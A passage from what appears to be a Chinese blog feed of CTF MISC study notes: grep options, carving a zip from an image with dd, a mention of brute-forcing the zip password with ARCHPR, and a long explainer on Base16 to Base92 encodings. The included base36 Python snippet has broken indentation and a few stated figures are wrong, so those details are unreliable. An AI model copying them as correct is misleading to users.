指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-F 或 –fixed-regexp</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 将样式视为固定字符串的列表。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-G 或 –basic-regexp</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 将样式视为普通的表示法来使用。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-h 或 –no-filename</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 在显示符合样式的那一行之前，不标示该行所属的文件名称。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-H 或 –with-filename</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 在显示符合样式的那一行之前，表示该行所属的文件名称。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-i 或 –ignore-case</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 忽略字符大小写的差别。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-l 或 –file-with-matches</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 列出文件内容符合指定的样式的文件名称。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-L 或 –files-without-match</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 列出文件内容不符合指定的样式的文件名称。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-n 或 –line-number</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 在显示符合样式的那一行之前，标示出该行的列数编号。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-o 或 –only-matching</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 只显示匹配PATTERN 部分。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-q 或 –quiet或–silent</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 不显示任何信息。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-r 或 –recursive</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 此参数的效果和指定”-d recurse”参数相同。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-s 或 –no-messages</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 不显示错误信息。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-v 或 –invert-match</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 显示不包含匹配文本的所有行。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-V 或 –version</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 显示版本信息。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-w 或 –word-regexp</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 只显示全字符合的列。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-x –line-regexp</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">: 只显示全列符合的列。</font></li><li><strong><font style="color:rgb(51, 51, 51);">-y </font></strong><font style="color:rgb(51, 51, 51);">: 此参数的效果和指定”-i”参数相同。</font></li></ul><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><img src="/./img/N3bqmkz3N9sqCs0h/1729134540624-462baf46-06e1-44a2-9fe9-e63dc20a62a9-784033.png" alt="1729134540624-462baf46-06e1-44a2-9fe9-e63dc20a62a9.png"></p><p><img src="/./img/N3bqmkz3N9sqCs0h/1729134537184-6227fde1-fdb3-47b0-87ac-787cc6b61b8a-864691.png" alt="1729134537184-6227fde1-fdb3-47b0-87ac-787cc6b61b8a.png"></p><p><img src="/./img/N3bqmkz3N9sqCs0h/1729134595517-2d471537-5758-4385-a7e7-d55650f1ecf3-200926.png" alt="1729134595517-2d471537-5758-4385-a7e7-d55650f1ecf3.png"></p><p><img src="/./img/N3bqmkz3N9sqCs0h/1729134520976-90378362-3a96-433f-9402-b8dee7c2d77a-239920.png" alt="1729134520976-90378362-3a96-433f-9402-b8dee7c2d77a.png"></p><p>grep “flag” -r -a _h*.e*</p><p><img src="/./img/N3bqmkz3N9sqCs0h/1729134766868-04df08be-32a4-4118-b653-7878a22ef17d-230602.png" alt="1729134766868-04df08be-32a4-4118-b653-7878a22ef17d.png"></p><blockquote><p>更新: 2024-10-17 11:13:48<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/xxpaobg647uyip2i">https://www.yuque.com/chaye-apqbl/vsc85q/xxpaobg647uyip2i</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/dd%E6%8C%87%E4%BB%A4/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/dd%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="dd指令"><a href="#dd指令" class="headerlink" title="dd指令"></a>dd指令</h1><p><a href="https://blog.csdn.net/qq_33160790/article/details/77488160">Linux 下的dd命令使用详解以及dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;的含义-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_51550750/article/details/122948993?ops_request_misc=%257B%2522request%255Fid%2522%253A%25227F140768-0CCB-4CCA-AE12-2109237313A7%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=7F140768-0CCB-4CCA-AE12-2109237313A7&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-122948993-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=dd%E5%91%BD%E4%BB%A4ctf&spm=1018.2226.3001.4187">20220215-CTF-MISC-BUUCTF-ningen–binwalk分析—dd命令分离–ARCHPR暴力破解_buuctf ningen-CSDN博客</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><img src="/./img/OjSe-C_1AHr8If3I/1729132732500-498e25cb-0701-4f48-9cf9-78460eb0fe7d-428984.png" alt="1729132732500-498e25cb-0701-4f48-9cf9-78460eb0fe7d.png"></p><p><font style="color:rgb(77, 77, 77);">显示有一个zip文件<br></font><font style="color:rgb(77, 77, 77);">尝试使用下面的dd命令分离</font></p><p><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">dd if&#x3D;图片名 of&#x3D;分离后的zip文件名 skip&#x3D;38689 bs&#x3D;1</font></p><p><font style="color:rgb(77, 77, 77);">分离成功，得到zip包：</font></p><p><img src="/./img/OjSe-C_1AHr8If3I/1729132785874-28e5b28c-8ea9-40af-b2e7-a54454afe2b5-409887.png" alt="1729132785874-28e5b28c-8ea9-40af-b2e7-a54454afe2b5.png"></p><p><font style="color:rgb(77, 77, 77);">双击打开：</font></p><p><img src="/./img/OjSe-C_1AHr8If3I/1729132797955-3ed9963a-d916-4b80-81ad-7080feacc7c9-072251.png" alt="1729132797955-3ed9963a-d916-4b80-81ad-7080feacc7c9.png"></p><p><font style="color:rgb(77, 77, 77);">里面有一个ningen.txt</font><br><font style="color:rgb(77, 77, 77);">但是要输入密码，根据提示：</font></p><p><img src="/./img/OjSe-C_1AHr8If3I/1729132812730-6ba6778c-f958-430f-8d23-743d66614241-206454.png" alt="1729132812730-6ba6778c-f958-430f-8d23-743d66614241.png"></p><p><font style="color:rgb(77, 77, 77);">尝试用ARCHPR暴力破解密码：</font></p><p><img src="/./img/OjSe-C_1AHr8If3I/1729132824573-d68796da-27b4-4e72-a0d6-fd3779d080cc-944294.png" alt="1729132824573-d68796da-27b4-4e72-a0d6-fd3779d080cc.png"></p><p><img src="/./img/OjSe-C_1AHr8If3I/1729132832536-3e6f3c76-128a-4245-9ba0-b4ab48d65dc5-519211.png" alt="1729132832536-3e6f3c76-128a-4245-9ba0-b4ab48d65dc5.png"></p><blockquote><p>更新: 2024-10-17 10:40:45<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/elspc7qgnd6inuoh">https://www.yuque.com/chaye-apqbl/vsc85q/elspc7qgnd6inuoh</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E8%AF%AD%E8%A8%80/logo%E8%AF%AD%E8%A8%80/"/>
    <url>/2026/01/19/MISC/%E8%AF%AD%E8%A8%80/logo%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="logo语言"><a href="#logo语言" class="headerlink" title="logo语言"></a>logo语言</h1><p><a href="https://www.calormen.com/jslogo/">https://www.calormen.com/jslogo/</a></p><blockquote><p>更新: 2024-11-17 15:46:05<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/lh7bia8yzfbc1bfc">https://www.yuque.com/chaye-apqbl/vsc85q/lh7bia8yzfbc1bfc</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E8%AF%AD%E8%A8%80/index/"/>
    <url>/2026/01/19/MISC/%E8%AF%AD%E8%A8%80/index/</url>
    
    <content type="html"><![CDATA[<h1 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h1><blockquote><p>更新: 2024-11-17 15:42:32<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gdmy7nn5bqp1yf8m">https://www.yuque.com/chaye-apqbl/vsc85q/gdmy7nn5bqp1yf8m</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%BC%96%E7%A0%81/%E8%A7%A3%E5%AF%86/"/>
    <url>/2026/01/19/MISC/%E7%BC%96%E7%A0%81/%E8%A7%A3%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><h1 id="Base系列编码浅析"><a href="#Base系列编码浅析" class="headerlink" title="Base系列编码浅析"></a><font style="color:rgb(0, 128, 128);">Base系列编码浅析</font></h1><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><strong><font style="color:rgb(0, 0, 0);">Base编码有很多种，常用</font>****<font style="color:rgb(0, 0, 0);">的有：</font></strong></p><p><font style="color:rgb(0, 0, 0);">  </font><strong><font style="color:rgb(0, 0, 0);">base16   base32   base64   base85  base36  base 58  base91  base 92   base62</font></strong></p><p><font style="color:rgb(0, 0, 0);"> </font></p><hr><p><strong><font style="color:rgb(0, 0, 0);"> </font></strong></p><h2 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a><strong><font style="color:rgb(0, 128, 128);">Base16</font></strong></h2><ul><li><strong><font style="color:rgb(0, 0, 0);"> </font></strong><font style="color:rgb(0, 0, 0);"> 使用16个ASCII可打印字符</font><strong><font style="color:rgb(0, 128, 128);">（数字0-9和字母A-F）</font></strong><font style="color:rgb(0, 0, 0);">，对任意字节数据进行编码。</font></li><li><font style="color:rgb(0, 0, 0);">     先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制。</font></li><li><font style="color:rgb(0, 0, 0);"> Base16编码后的数据量是原数据的两倍：1000比特数据需要250个字符（即 250*8&#x3D;2000 比特）。</font></li></ul><p><font style="color:rgb(0, 0, 0);"> </font></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715054999723-cd966302-d3f9-4b90-8956-93a0e2886295-378109.png" alt="1715054999723-cd966302-d3f9-4b90-8956-93a0e2886295.png"><font style="color:rgb(0, 0, 0);">                                    </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><strong><font style="color:rgb(0, 0, 0);">注</font></strong><font style="color:rgb(0, 0, 0);">：可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号“&#x3D;”。</font></p><p><font style="color:rgb(0, 0, 0);"> 换句话说：Base16使用两个ASCII字符去编码原数据中的一个字节数据。</font></p><p><font style="color:rgb(0, 0, 0);"> Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“&#x3D;”符号。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><hr><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><h2 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a><font style="color:rgb(0, 128, 128);">Base32</font></h2><p><font style="color:rgb(0, 0, 0);"> </font></p><ul><li><font style="color:rgb(0, 0, 0);">   Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理。</font></li><li><font style="color:rgb(0, 0, 0);">   Base32主要用于编码二进制数据，但是Base32也能够编码诸如ASCII之类的二进制文本。</font></li><li><font style="color:rgb(0, 0, 0);">   Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</font></li></ul><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715054999740-119b1eb7-f7ac-4fa8-9bfc-f38451263cd2-944777.png" alt="1715054999740-119b1eb7-f7ac-4fa8-9bfc-f38451263cd2.png"></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“&#x3D;”。填充“&#x3D;”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“&#x3D;”符号。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><hr><h2 id=""><a href="#" class="headerlink" title=""></a><font style="color:rgb(0, 0, 0);"></font></h2><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a><font style="color:rgb(0, 128, 128);">Base64</font></h2><ul><li><font style="color:rgb(0, 0, 0);">    Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于</font><img src="/"><font style="color:rgb(0, 0, 0);">，所以每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。</font></li><li><font style="color:rgb(0, 0, 0);">   在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法。</font></li><li><font style="color:rgb(0, 0, 0);">   它可用来作为电子邮件的传输编码。</font></li><li><font style="color:rgb(0, 0, 0);">    Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据，包括MIME的电子邮件及XML的一些复杂数据。</font></li></ul><p><font style="color:rgb(0, 0, 0);"> </font></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715055000028-1298ffe1-0538-4f50-8d8e-663a4a155837-711438.png" alt="1715055000028-1298ffe1-0538-4f50-8d8e-663a4a155837.png"></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">  注：BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> （1）先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。</font></p><p><font style="color:rgb(0, 0, 0);">     （2）在编码后的Base64文本后加上一个或两个&#x3D;号，代表补足的字节数。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 也就是说：</font></p><p><font style="color:rgb(0, 0, 0);"> 当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；</font></p><p><font style="color:rgb(0, 0, 0);"> 如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。 </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">参考下表：</font></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715054999888-ec0a017d-0f83-4377-8063-92d014907e6d-309781.png" alt="1715054999888-ec0a017d-0f83-4377-8063-92d014907e6d.png"></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><hr><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><h2 id="Base85"><a href="#Base85" class="headerlink" title="Base85"></a><strong><font style="color:rgb(0, 128, 128);">Base85</font></strong></h2><ul><li><font style="color:rgb(0, 0, 0);">        base85 也称为Ascii85，是Paul E. Rutter为btoa实用程序开发的一种二进制文本编码形式。通过使用五个ASCII字符来表示四个字节的二进制数据（使编码量1 &#x2F; 4比原来大，假设每ASCII字符8个比特），它比更有效UUENCODE或Base64的，它使用四个字符来表示三个字节的数据（1 &#x2F; 3的增加，假设每ASCII字符8个比特）。</font></li><li><font style="color:rgb(0, 0, 0);">        用途是Adobe的PostScript和Portable Document Format文件格式，以及Git使用的二进制文件的补丁编码。</font></li><li><font style="color:rgb(0, 0, 0);">        与Base64一样，Base85编码的目标是对二进制数据可打印的ASCII字符进行编码。但是它使用了更大的字符集，因此效率更高一些。具体来说，它可以用5个字符编码4个字节（32位）。</font></li></ul><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">摘自wiki介绍的一个例子：</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715055000044-d63897dd-fccf-4a7c-accb-b29209034074-469660.png" alt="1715055000044-d63897dd-fccf-4a7c-accb-b29209034074.png"></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><hr><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><strong><font style="color:rgb(0, 0, 0);"> </font></strong></p><h2 id="Base36"><a href="#Base36" class="headerlink" title="Base36"></a><strong><font style="color:rgb(0, 128, 128);">Base36</font></strong></h2><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">Base36是一个二进制到文本编码表示方案的二进制数据以ASCII通过将其转化为一个字符串格式基数 -36表示。选择36十分方便，因为可以使用阿拉伯数字 0–9和拉丁字母 A–Z [1]（ISO基本拉丁字母）表示数字。</font></p><p><font style="color:rgb(0, 0, 0);">每个base36位需要少于6位的信息来表示。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">摘自wiki的一个例子：</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">有符号的32位和64位整数分别最多只能容纳6个或13个base-36位数字（许多base-36位数字可能会使32位和64位整数溢出）。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">例如，在base-36中，“ 922337203685477575807 ” 的64位带符号整数最大值为“ 1Y2P0IJ32E8E7 ”。</font></p><p><font style="color:rgb(0, 0, 0);">类似地，在base-36中，“ 2147483647 ” 的32位带符号整数最大值为“ ZIK0ZJ ”。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">（这里没看太懂是怎么转换的，请大佬指教~）</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">用于从BASE10编码BASE36的Python代码</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715055000124-1f75903a-4542-478c-9d7e-520b68ed0d71-778372.gif" alt="1715055000124-1f75903a-4542-478c-9d7e-520b68ed0d71.gif"></p><p><font style="color:rgb(0, 0, 0);"></font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">def base36encode(integer): <br>    chars = &#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27; <br>    <br>     sign = &#x27;-&#x27; if integer &lt; 0 else &#x27;&#x27; <br>     integer = abs(integer) <br>     result = &#x27;&#x27; <br> <br>     while integer &gt; 0: <br>         integer, remainder = divmod(integer, 36) <br>         result = chars[remainder]+result<br> <br>      return sign+result<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715055000314-d1b81dfc-ace9-4633-9e62-fa0119b9303b-747958.gif" alt="1715055000314-d1b81dfc-ace9-4633-9e62-fa0119b9303b.gif"></p><hr><p><font style="color:rgb(0, 0, 0);"> </font></p><h2 id="Base58"><a href="#Base58" class="headerlink" title="Base58"></a><strong><font style="color:rgb(0, 128, 128);">Base58</font></strong></h2><p><font style="color:rgb(0, 0, 0);"> </font></p><ul><li><font style="color:rgb(0, 0, 0);">        Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。</font></li><li><font style="color:rgb(0, 0, 0);">        相比Base64，</font><strong><font style="color:rgb(0, 0, 0);">Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”&#x2F;“符号</font></strong><font style="color:rgb(0, 0, 0);">。</font></li></ul><p><font style="color:rgb(0, 0, 0);"> 设计Base58主要的目的是：</font></p><ol><li><font style="color:rgb(0, 0, 0);">避免混淆。在某些字体下，数字0和字母大写O，以及字母大写I和字母小写l会非常相似。</font></li><li><font style="color:rgb(0, 0, 0);">不使用”+”和”&#x2F;“的原因是非字母或数字的字符串作为帐号较难被接受。</font></li><li><font style="color:rgb(0, 0, 0);">没有标点符号，通常不会被从中间分行。</font></li><li><font style="color:rgb(0, 0, 0);">大部分的软件支持双击选择整个字符串。</font></li></ol><p><font style="color:rgb(0, 0, 0);"> </font></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715055000283-ab4e1073-1df1-4a4e-a35a-ea2eeb24d265-716194.png" alt="1715055000283-ab4e1073-1df1-4a4e-a35a-ea2eeb24d265.png"></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><hr><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><h2 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a><strong><font style="color:rgb(0, 128, 128);">Base91</font></strong></h2><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 顾名思义，basE91需要91个字符来表示ASCII编码的二进制数据。 从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建basE91字母：</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> -（破折号，0x2D）</font></p><p><font style="color:rgb(0, 0, 0);"> \（反斜杠，0x5C）</font></p><p><font style="color:rgb(0, 0, 0);"> ‘（撇号，0x27）</font></p><ul><li><font style="color:rgb(0, 0, 0);">    basE91是将二进制数据编码为ASCII字符的高级方法。 </font></li><li><font style="color:rgb(0, 0, 0);">    它类似于UUencode或base64，但效率更高。 basE91产生的开销取决于输入数据。 它的数量最多为23％（而base64为33％），范围可以降低到14％，通常发生在0字节块上。 </font></li><li><font style="color:rgb(0, 0, 0);">    这使得basE91对于通过二进制不安全连接（例如电子邮件或终端线）传输较大的文件非常有用。</font></li></ul><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);">转换表由其余字符组成，如下所示。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><img src="/./img/49277317_S9jFTtcXp7jOK0Zj/1715055000380-5bbae422-74c5-4f6e-9e3c-8994b81a1928-462296.png" alt="1715055000380-5bbae422-74c5-4f6e-9e3c-8994b81a1928.png"></p><p><font style="color:rgb(0, 0, 0);"> </font></p><hr><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><h2 id="Base92"><a href="#Base92" class="headerlink" title="Base92"></a><strong><font style="color:rgb(0, 128, 128);">Base92</font></strong></h2><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 有关Base92的资料实在是很少，但是笔者找到了这一篇博客：</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> <a href="https://thenoviceoof.com/blog/projects/base92/">https://thenoviceoof.com/blog/projects/base92/</a></font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><strong><font style="color:rgb(0, 0, 0);">以下介绍均摘自这篇博客</font></strong></p><p><font style="color:rgb(0, 0, 0);"></font></p><p><font style="color:rgb(0, 0, 0);"> “  如果您对将二进制信息从一个地方转移到另一地方一无所知，那么就知道将数据从一个地方转移到另一地方 可能很危险。就是说，这对您的数据有害：也许您需要在仅用于ASCII文本的通道上传输Blob ，并且所有’\n’以C样式字符串表示的字节都会突然有一个同级符号’\r’。或者，您的传输层实际上真的真的是以null终止的字符串，并且您恰好在字节边界上连续有8个连续的0位，即使它位于blob中一个32位整数的中间，并且你</font><font style="color:rgb(0, 0, 0);">结束了只有一半您的数据。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 解决此问题的一种方法是使用base64，它使用所有数字和大写&#x2F;小写字母字符对数据进行编码（再加上两个，但现在我们将忽略它们）。现在，您在传输层上尝试解释您的字节时没有任何问题，因为每个人都可以很好地处理字母数字字符，如果没有，您可能不想使用它们。</font></p><p><font style="color:rgb(0, 0, 0);">当然，使用base64了一段时间后，您可能会注意到，虽然您不会因为一位反复无常的上帝以为他在提供帮助，却没有按照自己的意愿对数据进行更改，但您却通过使用放弃了效率base64。对于二进制blob中的每3个字节，如果需要传输字母数字字符，则有4个字节，因此您要以33％的容量税来支付数据保护费用：如果暴徒可以在保护球拍中掠走33％，相信他们会的。</font></p><p><font style="color:rgb(0, 0, 0);"> 看一下base64，您可能会注意到，除了可以使用的64个字符外，还有更多可显示的ASCII字符，base64可以在编码中使用这些字符以提高传输密度。这样就base85诞生了，使用了……您猜对了，有85个字符！这次，将4字节的二进制数据编码为5个ASCII字符，这将导致20％的传输大小开销。但你能做什么呢？好像没有更多可显示的ASCII了……哦，等等。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 所以似乎没有人试图超越明显的下一步base85，所以我决定尝试自己做base92。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> 在键入编码的字符串时，&#96;和“与普通引号’太相似，以使其舒适。希望在区分l &#x2F; 1和0 &#x2F; O时使用的字体好。</font><font style="color:rgb(0, 0, 0);">但是，我们将〜用作特殊符号（空字符串）。有94个可打印的ascii字符，因此我们最终得到91个字符，或每个字符6.5位。一旦包含〜，则将有92个字符：因此，为base92。（老实说，base91的名字太丑陋了，无法处理）</font></p><p><font style="color:rgb(0, 0, 0);"> 一旦每个字符有6.5位，则可以一次使用13位，并使用类似于base85的除法和取模方案，用它们产生两个输出字符。这可能意味着，与base92编码相比，它更能抵抗损坏，因为任何损坏都更加局限（一位更改仅影响2-3个字节，而不影响4个字节）。</font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 0);"> </font></p><p><font style="color:rgb(0, 0, 